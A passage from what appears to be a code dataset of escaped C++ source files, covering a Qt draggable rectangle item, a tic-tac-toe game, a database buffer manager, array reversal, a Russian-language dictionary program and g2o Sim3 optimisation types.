newRect(mapFromScene(LT), mapFromScene(RB));\n            setRect(newRect);\n        }\n    }\n    else if (isDraggingBottomRightHandle)\n    { // \u5982\u679c\u6b63\u5728\u62d6\u52a8\u53f3\u4e0b\u89d2\u53e5\u67c4\uff0c\u66f4\u65b0\u77e9\u5f62\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\n        QPointF tempRB=event->scenePos();\n        if(tempRB.x()-10>LT.x()&&tempRB.y()-10>LT.y())\n        {\n            RB=event->scenePos();\n            QRectF newRect(mapFromScene(LT), mapFromScene(RB));\n            setRect(newRect);\n        }\n    }\n    else if (isDraggingRect)\n    {\n        RB=mapToScene(rect().bottomRight());\n        LT=mapToScene(rect().topLeft());\n        qDebug()<<\"RB: \"<<RB<<\" LT: \"<<LT<<\" pos: \"<<event->scenePos()<<Qt::endl;\n    }\n    updateHandlesPosition(); // \u66f4\u65b0\u53e5\u67c4\u4f4d\u7f6e\n    update();\n    QGraphicsRectItem::mouseMoveEvent(event); // \u8c03\u7528\u57fa\u7c7b\u7684\u9f20\u6807\u79fb\u52a8\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\n}\n\n// \u9f20\u6807\u91ca\u653e\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\nvoid CustomRectangleItem::mouseReleaseEvent(QGraphicsSceneMouseEvent *event) {\n    isDraggingTopLeftHandle = false; // \u91cd\u7f6e\u5de6\u4e0a\u89d2\u53e5\u67c4\u62d6\u52a8\u72b6\u6001\u4e3afalse\n    isDraggingBottomRightHandle = false; // \u91cd\u7f6e\u53f3\u4e0b\u89d2\u53e5\u67c4\u62d6\u52a8\u72b6\u6001\u4e3afalse\n    isDraggingRect=false;\n    QGraphicsRectItem::mouseReleaseEvent(event); // \u8c03\u7528\u57fa\u7c7b\u7684\u9f20\u6807\u91ca\u653e\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\n}\n",
    "#include<iostream>\nusing namespace std;\nstring user1=\"\";\n    string user2=\"\";\n    char flag;\n char mat[3][3]={{'1','2','3'},{'4','5','6'},{'7','8','9'}};\n int row,col;\n char token;\n\nvoid print(){ \n   cout<<endl;\n   cout<< \" \"<<mat[0][0] <<\" |\"<<\" \"<<mat[0][1] <<\"  |\"<<\" \"<<mat[0][2]<<endl;\n   cout<<\"-------------\"<<endl;\n   cout<< \" \"<<mat[1][0] <<\" |\"<<\" \"<<mat[1][1] <<\"  |\"<<\" \"<<mat[1][2]<<endl; \n   cout<<\"-------------\"<<endl;\n   cout<< \" \"<<mat[2][0] <<\" |\"<<\" \"<<mat[2][1] <<\"  |\"<<\" \"<<mat[2][2]<<endl;\n  cout<<endl;\n}\n\nvoid move(){\n   char dig;\n   if(token=='X'){\n      cout<<user1<<\" enter position for X: \";\n      cin>>dig;\n   }\n   else{\n      cout<<user2<<\" enter position for O: \";\n      cin>>dig;\n   }\n\n   if(dig=='1'){\n      row=0;\n      col=0;\n      \n   }\n   else if(dig=='2'){\n      row=0;\n      col=1;\n   }\n    else if(dig=='3'){\n      row=0;\n      col=2;\n   }\n    else if(dig=='4'){\n      row=1;\n      col=0;\n   }\n    else if(dig=='5'){\n      row=1;\n      col=1;\n   }\n    else if(dig=='6'){\n      row=1;\n      col=2;\n   }\n    else if(dig=='7'){\n      row=2;\n      col=0;\n   }\n    else if(dig=='8'){\n      row=2;\n      col=1;\n   }\n    else if(dig=='9'){\n      row=2;\n      col=2;\n   }\n   else{\n      cout<<\"!!!!!!!!!!Invalid position!!!!!!!!!!\"<<endl;\n      row=-1;\n      col=-1;\n   }\n\n   if(row!=-1 && col!=-1){\n      if(token =='X' && mat[row][col]!='X' && mat[row][col]!='O'){\n        mat[row][col]='X';\n        token ='O';\n     }\n   else if(token =='O' && mat[row][col]!='X' && mat[row][col]!='O'){\n      mat[row][col]='O';\n      token ='X';\n   }\n   else{\n      cout<<\"!!!!!!!!!!Invalid position!!!!!!!!!!\"<<endl;\n   }\n   }\n}\n\nbool condition(){\n   for(int i=0;i<3;i++){\n      if(mat[i][0]=='X' && mat[i][1]=='X' && mat[i][2]=='X' || mat[0][i]=='X' && mat[1][i]=='X' && mat[2][i]=='X'){\n   flag='X';\n   return true;\n  }\n   }\n\n   for(int i=0;i<3;i++){\n      if(mat[i][0]=='O' && mat[i][1]=='O' && mat[i][2]=='O' || mat[0][i]=='O' && mat[1][i]=='O' && mat[2][i]=='O'){\n   flag='O';\n   return true;\n  }\n   }\n\n   if(mat[0][0]=='X' && mat[1][1]=='X' && mat[2][2]=='X'){\n      flag='X';\n   return true;\n   }\n\n   if(mat[0][0]=='O' && mat[1][1]=='O' && mat[2][2]=='O'){\n      flag='O';\n   return true;\n   }\n\n   if(mat[0][2]=='X' && mat[1][1]=='X' && mat[2][0]=='X'){\n      flag='O';\n   return true;\n   }\n\n   if(mat[0][2]=='O' && mat[1][1]=='O' && mat[2][0]=='O'){\n      flag='O';\n   return true;\n   }\n\n   for(int i=0;i<3;i++){\n      for(int j=0;j<3;j++){\n         if(mat[i][j]!='X' && mat[i][j]!='O'){\n            flag='d';\n            return false;\n         }\n      }\n   } \n  return true;\n}\n\nint main(){\n\n   cout<<\"Enter user1 name: \";\n   cin>>user1;\n   cout<<\"Enter user2 name: \";\n   cin>>user2;\n   cout<<user1<<\" your token is X::\"<<endl;\n   cout<<user2<<\" your token is O::\"<<endl;\n   cout<<\"What will be first move X or O: \";\n   cin>>token;\n\n   while(!condition()){\n      print();\n      move();\n   }\n   if(flag=='X'){\n      print();\n      cout<<user1<<\"!!!you won!!!\"<<endl;\n   }\n   else if(flag=='O'){\n      print();\n      cout<<user2<<\"!!!you won!!!\"<<endl;\n   }\n   else{\n      print();\n      cout<<\"!!!!!!!Game Draw!!!!!!!!!\"<<endl;\n   }\n   return 0;\n}",
    "#include \"StaticBuffer.h\"\n#include <stdio.h>\n\n// the declarations for this class can be found at \"StaticBuffer.h\"\n\nunsigned char StaticBuffer::blocks[BUFFER_CAPACITY][BLOCK_SIZE];\nstruct BufferMetaInfo StaticBuffer::metainfo[BUFFER_CAPACITY];\nunsigned char StaticBuffer::blockAllocMap[DISK_BLOCKS];\n\nvoid printBuffer (int bufferIndex, unsigned char buffer[]) {\n\tfor (int i = 0; i < BLOCK_SIZE; i++) {\n\t\tif (i % 32 == 0) printf (\"\\n\");\n\t\tprintf (\"%u \", buffer[i]);\n\t}\n\tprintf (\"\\n\");\n\tprintf (\"\\n\");\n\tfor (int i = 0; i < BLOCK_SIZE; i++) {\n\t\tif (i % 32 == 0) printf (\"\\n\");\n\t\tprintf (\"%c \", buffer[i]);\n\t}\n\tprintf (\"\\n\");\n}\n\nStaticBuffer::StaticBuffer(){\n\tfor (int blockIndex = 0, blockAllocMapSlot = 0; blockIndex < 4; blockIndex++) {\n\t\tunsigned char buffer [BLOCK_SIZE];\n\t\tDisk::readBlock(buffer, blockIndex);\n\n\t\tfor (int slot = 0; slot < BLOCK_SIZE; slot++, blockAllocMapSlot++)\n\t\t\tStaticBuffer::blockAllocMap[blockAllocMapSlot] = buffer[slot];\n\t}\n\n\t// initialise all blocks as free\n\tfor (int bufferIndex = 0; bufferIndex < BUFFER_CAPACITY; bufferIndex++) {\n\t\tmetainfo[bufferIndex].free = true;\n\t\tmetainfo[bufferIndex].dirty = false;\n\t\tmetainfo[bufferIndex].timeStamp = -1;\n\t\tmetainfo[bufferIndex].blockNum = -1;\n\t}\n}\n\n// write back all modified blocks on system exit\nStaticBuffer::~StaticBuffer() {\n\tfor (int blockIndex = 0, blockAllocMapSlot = 0; blockIndex < 4; blockIndex++) {\n\t\tunsigned char buffer [BLOCK_SIZE];\n\n\t\tfor (int slot = 0; slot < BLOCK_SIZE; slot++, blockAllocMapSlot++) \n\t\t\tbuffer[slot] = blockAllocMap[blockAllocMapSlot];\n\n\t\tDisk::writeBlock(buffer, blockIndex);\n\t}\n\n  \t// iterate through all the buffer blocks, write back blocks \n\t// with metainfo as free=false,dirty=true using Disk::writeBlock()\n\n\tfor (int bufferIndex = 0; bufferIndex < BUFFER_CAPACITY; bufferIndex++) {\n\t\tif (metainfo[bufferIndex].free == false \n\t\t\t&& metainfo[bufferIndex].dirty == true)\n\t\t\tDisk::writeBlock(blocks[bufferIndex], metainfo[bufferIndex].blockNum);\n\t}\n}\n\n\n/*\nAt this stage, we are not writing back from the buffer to the disk since we are\nnot modifying the buffer. So, we will define an empty destructor for now. In\nsubsequent stages, we will implement the write-back functionality here.\n*/\n// StaticBuffer::~StaticBuffer() {}\n\nint StaticBuffer::getFreeBuffer(int blockNum) {\n\tif (blockNum < 0 || blockNum >= DISK_BLOCKS) return E_OUTOFBOUND;\n\tfor (int bufferIndex = 0; bufferIndex < BUFFER_CAPACITY; bufferIndex++)\n\t\tmetainfo[bufferIndex].timeStamp++;\n\n\tint allocatedBuffer = 0;\n\n\t// TODO: iterate through all the blocks in the StaticBuffer\n\t// TODO: find the first free block in the buffer (check metainfo)\n\t// TODO: assign allocatedBuffer = index of the free block\n\tfor (; allocatedBuffer < BUFFER_CAPACITY; allocatedBuffer++)\n\t\tif (metainfo[allocatedBuffer].free) break;\n\n\tif (allocatedBuffer == BUFFER_CAPACITY) {\n\t\tint lastTimestamp = -1, bufferNum = -1;\n\t\tfor (int bufferIndex = 0; bufferIndex < BUFFER_CAPACITY; bufferIndex++) {\n\t\t\tif (metainfo[bufferIndex].timeStamp > lastTimestamp) {\n\t\t\t\tlastTimestamp = metainfo[bufferIndex].timeStamp;\n\t\t\t\tbufferNum = bufferIndex;\n\t\t\t}\n\t\t}\n\n\t\tallocatedBuffer = bufferNum;\n\t\tif (metainfo[allocatedBuffer].dirty == true) {\n\t\t\tDisk::writeBlock(StaticBuffer::blocks[allocatedBuffer], \n\t\t\t\t\t\t\t\tmetainfo[allocatedBuffer].blockNum);\n\t\t}\n\n\t\t// return FAILURE;\n\t}\n\n\tmetainfo[allocatedBuffer].free = false, \n\tmetainfo[allocatedBuffer].dirty = false,\n\tmetainfo[allocatedBuffer].timeStamp = 0, \n\tmetainfo[allocatedBuffer].blockNum = blockNum;\n\n\treturn allocatedBuffer;\n}\n\n//* Get the buffer index where a particular block is stored or E_BLOCKNOTINBUFFER otherwise\nint StaticBuffer::getBufferNum(int blockNum) {\n\t// Check if blockNum is valid (between zero and DISK_BLOCKS)\n\t// and return E_OUTOFBOUND if not valid.\n\tif (blockNum < 0 || blockNum >= DISK_BLOCKS) return E_OUTOFBOUND;\n\n\t// find and return the bufferIndex which corresponds to blockNum (check metainfo)\n\tfor (int bufferBlock = 0; bufferBlock < BUFFER_CAPACITY; bufferBlock++){\n\t\tif (metainfo[bufferBlock].free == false \n\t\t\t&& metainfo[bufferBlock].blockNum == blockNum) \n\t\t\treturn bufferBlock;\n\t}\n\n\t//! if block is not in the buffer\n\treturn E_BLOCKNOTINBUFFER;\n}\n\nint StaticBuffer::setDirtyBit(int blockNum){\n    // find the buffer index corresponding to the block using getBufferNum().\n\tint bufferIndex = getBufferNum(blockNum);\n\n    //! if block is not present in the buffer (bufferNum = E_BLOCKNOTINBUFFER)\n\tif (bufferIndex == E_BLOCKNOTINBUFFER)\n        return E_BLOCKNOTINBUFFER;\n\n    //! if blockNum is out of bound (bufferNum = E_OUTOFBOUND)\n\tif (bufferIndex == E_OUTOFBOUND)\n        return E_OUTOFBOUND;\n\n    // else (the bufferNum is valid)\n    //     set the dirty bit of that buffer to true in metainfo\n\tmetainfo[bufferIndex].dirty = true;\n\n    return SUCCESS;\n}\n\n\nint StaticBuffer::getStaticBlockType(int blockNum){\n    // Check if blockNum is valid (non zero and less than number of disk blocks)\n    // and return E_OUTOFBOUND if not valid.\n\tif(blockNum<0 or blockNum>=DISK_BLOCKS)\n\t",
    "#include<iostream>\n\nvoid reverseArray(int arr[], int arraylength) {\n    int start = 0;\n    int end = arraylength - 1;\n    \n    while (start < end) {\n        // Swap elements at start and end indices\n        int temp = arr[start];\n        arr[start] = arr[end];\n        arr[end] = temp;\n        \n        // Move indices towards the center\n        start++;\n        end--;\n    }\n}\n\n\nvoid reverseArrayBitwise(int arr[], int arraylength) {\n    int start = 0;\n    int end = arraylength - 1;\n    \n    while (start < end) {\n        // Swap elements at start and end indices without extra variable using XOR\n        arr[start] = arr[start] ^ arr[end];\n        arr[end] = arr[start] ^ arr[end];\n        arr[start] = arr[start] ^ arr[end];\n        \n        // Move indices towards the center\n        start++;\n        end--;\n    }\n}\n\nint main() {\n    int arr[] = {1, 2, 3, 4, 5};\n    int arraylength = sizeof(arr) / sizeof(arr[0]); // Calculate array length\n    \n    std::cout << \"Original array: \";\n    for (int i = 0; i < arraylength; i++) {\n        std::cout << arr[i] << \" \";\n    }\n    std::cout << std::endl;\n    \n    reverseArray(arr, arraylength); // Reverse the array\n    \n    std::cout << \"Reversed array: \";\n    for (int i = 0; i < arraylength; i++) {\n        std::cout << arr[i] << \" \";\n    }\n    std::cout << std::endl;\n    \n    return 0;\n}\n\n\n//time complexity is O(n).\n//space complexity is O(1).",
    "\ufeff#include \"stdafx.h\"\r\n#include \"macros.h\"\r\n#pragma warning(disable : 4996)\r\n\r\nvoid Dictionary::menu()\r\n{\r\n\tstd::cout << \"1 - \u0421\u043e\u0437\u0434\u0430\u0442\u044c \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f \" << std::endl;\r\n\tstd::cout << \"2 - \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u0441\u043b\u043e\u0432\u0430\u0440\u044f \" << std::endl;\r\n\tstd::cout << \"3 - \u0423\u0434\u0430\u043b\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u0441\u043b\u043e\u0432\u0430\u0440\u044f \" << std::endl;\r\n\tstd::cout << \"4 - \u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u0441\u043b\u043e\u0432\u0430\u0440\u044f \" << std::endl;\r\n\tstd::cout << \"5 - \u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u0441\u043b\u043e\u0432\u0430\u0440\u044f \" << std::endl;\r\n\tstd::cout << \"6 - \u0423\u0434\u0430\u043b\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0441\u043b\u043e\u0432\u0430\u0440\u044f \" << std::endl;\r\n\tstd::cout << \"7 - \u0420\u0430\u0441\u043f\u0435\u0447\u0430\u0442\u0430\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0441\u043b\u043e\u0432\u0430\u0440\u044f \" << std::endl;\r\n\tstd::cout << \"0 - \u0412\u044b\u0445\u043e\u0434 \" << std::endl << std::endl;\r\n}\r\n//10. \u041c\u0435\u0441\u0442\u043e \u0432 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435, \u0433\u0434\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u043f\u0430\u043c\u044f\u0442\u044c \u0438\u0437 \u043a\u0443\u0447\u0438\r\n//14. \u041f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0441\u0442\u0432\u043e \u0438\u043c\u0435\u043d \u043f\u0440\u0438\u043c\u0435\u043d\u044f\u0435\u0442\u0441\u044f \u0432 \u043a\u043e\u0434\u0435 \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u0435\u0444\u0438\u043a\u0441 `Dictionary::`\r\nDictionary::Instance Dictionary::Create(char name[DICTNAMEMAXSIZE], int size)\r\n{\r\n\tInstance new_dictionary;\r\n\tInstance fake;\r\n\tnew_dictionary.dictionary = new Entry[DICTMAXSIZE];\r\n\r\n\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u0441\u043b\u043e\u0432\u0430\u0440\u044f: \";\r\n\tstd::cin >> name;\r\n\tstrcpy(new_dictionary.name, name);\r\n\r\n\tif (strlen(name) > DICTNAMEMAXSIZE)\r\n\t{\r\n\t\tthrow std::length_error(THROW01);\r\n\t\treturn fake;\r\n\t}\r\n\r\n\tif (size >= DICTMAXSIZE)\r\n\t{\r\n\t\tthrow std::overflow_error(THROW02);\r\n\t\treturn fake;\r\n\t}\r\n\r\n\treturn new_dictionary;\r\n}\r\n\r\nvoid Dictionary::AddEnrty(Instance inst[], Entry ed[], int size_num)\r\n{\r\n\tint i;\r\n\r\n\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u043b\u044f \u043a\u0430\u043a\u043e\u0433\u043e \u0441\u043b\u043e\u0432\u0430\u0440\u044f \u0432\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0432\u043f\u0438\u0441\u0430\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b: \";\r\n\tstd::cin >> i;\r\n\ti--;\r\n\r\n\tif (i < 0 || i >= size_num)\r\n\t{\r\n\t\tstd::cout << \"\u041d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f\" << std::endl;\r\n\t\treturn;\r\n\t}\r\n\r\n\tif (inst[i].maxsize >= DICTMAXSIZE)\r\n\t{\r\n\t\tthrow std::exception(THROW03);\r\n\t\treturn;\r\n\t}\r\n\r\n\r\n\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f: \";\r\n\tstd::cin >> inst[i].dictionary[inst[i].maxsize].name;\r\n\r\n\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 id: \";\r\n\tstd::cin >> inst[i].dictionary[inst[i].maxsize].id;\r\n\r\n\tfor (int j = 0; j < inst[i].maxsize; j++)\r\n\t{\r\n\t\tif (inst[i].dictionary[j].id == inst[i].dictionary[inst[i].maxsize].id)\r\n\t\t\tthrow std::exception(THROW04);\r\n\t}\r\n\r\n\tinst[i].maxsize++;\r\n}\r\n\r\nvoid Dictionary::UpdEntry(Instance inst[], Entry new_ed[], int size_num)\r\n{\r\n\tint i, choice_number;\r\n\r\n\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f, \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u0432\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c: \";\r\n\tstd::cin >> i;\r\n\ti--;\r\n\r\n\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430: \";\r\n\tstd::cin >> choice_number;\r\n\tchoice_number--;\r\n\r\n\tif (choice_number < 1 && choice_number > inst[i].maxsize)\r\n\t{\r\n\t\tthrow std::exception(THROW07);\r\n\t\treturn;\r\n\t}\r\n\r\n\r\n\r\n\tif (i < 0 || i >= size_num)\r\n\t{\r\n\t\tstd::cout << \"\u041d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f\" << std::endl;\r\n\t\treturn;\r\n\t}\r\n\r\n\r\n\tint new_id;\r\n\tbool id_exists = false;\r\n\r\n\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 id: \";\r\n\tstd::cin >> new_id;\r\n\r\n\r\n\tfor (int j = 0; j < inst[i].maxsize; j++)\r\n\t{\r\n\t\tif (j != choice_number && inst[i].dictionary[j].id == new_id)\r\n\t\t{\r\n\t\t\tid_exists = true;\r\n\t\t\tthrow std::overflow_error(THROW08);\r\n\t\t\treturn;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\tif (!id_exists)\r\n\t\tinst[i].dictionary[choice_number].id = new_id;\r\n\r\n}\r\n\r\nDictionary::Entry Dictionary::GetEntry(Instance inst[], int id, int size_num)\r\n{\r\n\tEntry element;\r\n\tint i;\r\n\r\n\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f, \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u0432\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u043d\u0430\u0439\u0442\u0438: \";\r\n\tstd::cin >> i;\r\n\ti--;\r\n\r\n\tif (i < 0 || i >= size_num)\r\n\t{\r\n\t\tstd::cout << \"\u041d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f\" << std::endl;\r\n\t\treturn element;\r\n\t}\r\n\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 id \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430: \";\r\n\tstd::cin >> id;\r\n\r\n\tfor (int j = 0; j < inst[i].maxsize; j++)\r\n\t{\r\n\t\tif (inst[i].dictionary[j].id == id)\r\n\t\t{\r\n\t\t\tstd::cout << inst[i].dictionary[j].name << std::endl;\r\n\t\t\tstd::cout << inst[i].dictionary[j].id << std::endl << std::endl;\r\n\t\t\treturn element;\r\n\t\t}\r\n\t}\r\n\r\n\tthrow std::exception(THROW05);\r\n}\r\n\r\nvoid Dictionary::Print(Instance d[], int size)\r\n{\r\n\r\n\tfor (int i = 0; i < size; i++)\r\n\t{\r\n\t\tstd::cout << \"------------ \" << d[i].name << \" ------------ \" << std::endl;\r\n\t\tfor (int j = 0; j < d[i].maxsize; j++)\r\n\t\t{\r\n\t\t\tstd::cout << d[i].dictionary[j].name << std::endl;\r\n\t\t\tstd::cout << d[i].dictionary[j].id << std::endl << std::endl;\r\n\t\t}\r\n\t}\r\n\r\n\r\n}\r\n\r\nvoid Dictionary::DelEntry(Instance inst[], int id, int size_num)\r\n{\r\n\tint i;\r\n\r\n\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u043b\u044f \u043a\u0430\u043a\u043e\u0433\u043e \u0441\u043b\u043e\u0432\u0430\u0440\u044f \u0432\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0432\u043f\u0438\u0441\u0430\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b: \";\r\n\tstd::cin >> i;\r\n\ti--;\r\n\r\n\tif (i < 0 || i >= size_num)\r\n\t{\r\n\t\tstd::cout << \"\u041d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f\" << std::endl;\r\n\t\treturn;\r\n\t}\r\n\r\n\tif (inst[i].maxsize >= DICTMAXSIZE)\r\n\t{\r\n\t\tstd::cout << \"\u0421\u043b\u0438\u0448\u043a\u043e\u043c \u043c\u043d\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0432 \u0441\u043b\u043e\u0432\u0430\u0440\u0435\" << std::endl;\r\n\t\treturn;\r\n\t}\r\n\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 id \u0434\u043b\u044f \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430: \";\r\n\tstd::cin >> id;\r\n\r\n\tfor (int j = 0; j < inst[i].maxsize; j++)\r\n\t{\r\n\t\tif (inst[i].dictionary[j].id == id)\r\n\t\t{\r\n\r\n\t\t\tinst[i].dictionary[j] = inst[i].dictionary[inst[i].maxsize - 1];\r\n\t\t\tinst[i].maxsize--;\r\n\t\t\tstd::cout << \"\u042d\u043b\u0435\u043c\u0435\u043d\u0442 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0434\u0430\u043b\u0435\u043d\" << std::endl;\r\n\t\t\treturn;\r\n\t\t}\r\n\t}\r\n\r\n\tthrow std::exception(THROW06);\r\n\r\n}\r\n\r\nvoid Dictionary::Delete(Instance d[])\r\n{\r\n\tint i;\r\n\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f \u0434\u043b\u044f \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f: \";\r\n\tstd::cin >> i;\r\n\ti--;\r\n\r\n\tif (i < 0 || i >= DICTMAXSIZE)\r\n\t{\r\n\t\tstd::cout << \"\u041d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u043e\u0432\u0430\u0440\u044f\" << std::endl;\r\n\t\treturn;\r\n\t}\r\n",
    "// g2o - General Graph Optimization\n// Copyright (C) 2011 H. Strasdat\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"types_seven_dof_expmap.h\"\n\nnamespace g2o {\n\n  VertexSim3Expmap::VertexSim3Expmap() : BaseVertex<7, Sim3>()\n  {\n    _marginalized=false;\n    _fix_scale = false;\n  }\n\n\n  EdgeSim3::EdgeSim3() :\n      BaseBinaryEdge<7, Sim3, VertexSim3Expmap, VertexSim3Expmap>()\n  {\n  }\n\n\n  bool VertexSim3Expmap::read(std::istream& is)\n  {\n    Vector7d cam2world;\n    for (int i=0; i<6; i++){\n      is >> cam2world[i];\n    }\n    is >> cam2world[6];\n//    if (! is) {\n//      // if the scale is not specified we set it to 1;\n//      std::cerr << \"!s\";\n//      cam2world[6]=0.;\n//    }\n\n    for (int i=0; i<2; i++)\n    {\n      is >> _focal_length1[i];\n    }\n    for (int i=0; i<2; i++)\n    {\n      is >> _principle_point1[i];\n    }\n\n    setEstimate(Sim3(cam2world).inverse());\n    return true;\n  }\n\n  bool VertexSim3Expmap::write(std::ostream& os) const\n  {\n    Sim3 cam2world(estimate().inverse());\n    Vector7d lv=cam2world.log();\n    for (int i=0; i<7; i++){\n      os << lv[i] << \" \";\n    }\n    for (int i=0; i<2; i++)\n    {\n      os << _focal_length1[i] << \" \";\n    }\n    for (int i=0; i<2; i++)\n    {\n      os << _principle_point1[i] << \" \";\n    }\n    return os.good();\n  }\n\n  bool EdgeSim3::read(std::istream& is)\n  {\n    Vector7d v7;\n    for (int i=0; i<7; i++){\n      is >> v7[i];\n    }\n\n    Sim3 cam2world(v7);\n    setMeasurement(cam2world.inverse());\n\n    for (int i=0; i<7; i++)\n      for (int j=i; j<7; j++)\n      {\n        is >> information()(i,j);\n        if (i!=j)\n          information()(j,i)=information()(i,j);\n      }\n    return true;\n  }\n\n  bool EdgeSim3::write(std::ostream& os) const\n  {\n    Sim3 cam2world(measurement().inverse());\n    Vector7d v7 = cam2world.log();\n    for (int i=0; i<7; i++)\n    {\n      os  << v7[i] << \" \";\n    }\n    for (int i=0; i<7; i++)\n      for (int j=i; j<7; j++){\n        os << \" \" <<  information()(i,j);\n    }\n    return os.good();\n  }\n\n  /**Sim3ProjectXYZ*/\n\n  EdgeSim3ProjectXYZ::EdgeSim3ProjectXYZ() :\n  BaseBinaryEdge<2, Vector2d, VertexSBAPointXYZ, VertexSim3Expmap>()\n  {\n  }\n\n  bool EdgeSim3ProjectXYZ::read(std::istream& is)\n  {\n    for (int i=0; i<2; i++)\n    {\n      is >> _measurement[i];\n    }\n\n    for (int i=0; i<2; i++)\n      for (int j=i; j<2; j++) {\n  is >> information()(i,j);\n      if (i!=j)\n        information()(j,i)=information()(i,j);\n    }\n    return true;\n  }\n\n  bool EdgeSim3ProjectXYZ::write(std::ostream& os) const\n  {\n    for (int i=0; i<2; i++){\n      os  << 